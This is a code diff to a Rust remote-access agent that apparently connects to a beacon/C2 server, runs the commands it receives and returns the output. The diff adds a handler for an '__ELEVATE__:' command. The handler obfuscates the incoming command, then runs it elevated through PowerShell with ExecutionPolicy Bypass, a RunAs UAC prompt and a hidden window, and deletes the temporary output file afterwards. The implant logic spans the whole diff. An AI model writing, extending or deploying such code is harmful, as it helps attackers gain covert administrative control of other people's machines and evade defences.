@@ -153,6 +153,14 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
                     if !send_response(&mut writer, &response) {
                         break;
                     }
+                } else if command.starts_with("__ELEVATE__:") {
+                    // Comando para ejecutar con privilegios elevados: __ELEVATE__:comando
+                    let cmd = command.strip_prefix("__ELEVATE__:").unwrap_or("");
+                    debug_print!("DEBUG: Elevating command: {}", cmd);
+                    let response = elevate_command(cmd);
+                    if !send_response(&mut writer, &response) {
+                        break;
+                    }
                 } else if !command.is_empty() {
                     let output = execute_command(command);
                     let response = format!("{}{}", output, DELIMITER);
@@ -270,6 +278,55 @@ fn execute_command(command: &str) -> String {
             format!("{}{}", stdout, stderr)
         }
         Err(e) => format!("Error: {}", e),
+    }
+}
+
+/// Ejecuta un comando con privilegios elevados usando UAC
+/// Usa PowerShell Start-Process con -Verb RunAs para mostrar el prompt UAC
+fn elevate_command(command: &str) -> String {
+    debug_print!("DEBUG: Elevando comando: {}", command);
+    
+    // Aplicar ofuscación al comando
+    let obfuscated_cmd = argfuscator::obfuscate(command);
+    
+    // Escapar comillas dobles en el comando para PowerShell
+    let escaped_cmd = obfuscated_cmd.replace("\"", "`\"");
+    
+    // Construir el script de PowerShell que ejecutará el comando con privilegios elevados
+    // Usamos Start-Process con -Verb RunAs para activar UAC
+    // -Wait hace que esperemos a que termine
+    // -WindowStyle Hidden intenta ocultar la ventana (aunque UAC siempre será visible)
+    let ps_script = format!(
+        "Start-Process cmd.exe -ArgumentList '/c \"{} > %TEMP%\\elevated_output.txt 2>&1\"' -Verb RunAs -Wait -WindowStyle Hidden; Get-Content $env:TEMP\\elevated_output.txt; Remove-Item $env:TEMP\\elevated_output.txt -ErrorAction SilentlyContinue",
+        escaped_cmd
+    );
+    
+    debug_print!("DEBUG: PowerShell script: {}", ps_script);
+    
+    // Ejecutar PowerShell con el script
+    let output = Command::new("powershell")
+        .args(&[
+            "-NoProfile",
+            "-NonInteractive", 
+            "-ExecutionPolicy", "Bypass",
+            "-Command", &ps_script
+        ])
+        .output();
+    
+    match output {
+        Ok(out) => {
+            let stdout = String::from_utf8_lossy(&out.stdout);
+            let stderr = String::from_utf8_lossy(&out.stderr);
+            
+            if out.status.success() {
+                format!("__INFO__:Comando elevado ejecutado exitosamente\n{}{}{}", stdout, stderr, DELIMITER)
+            } else {
+                format!("__ERROR__:Error al elevar comando (¿Usuario rechazó UAC?)\n{}{}{}", stdout, stderr, DELIMITER)
+            }
+        }
+        Err(e) => {
+            format!("__ERROR__:Error ejecutando PowerShell para elevación: {}{}", e, DELIMITER)
+        }
     }
 }
 
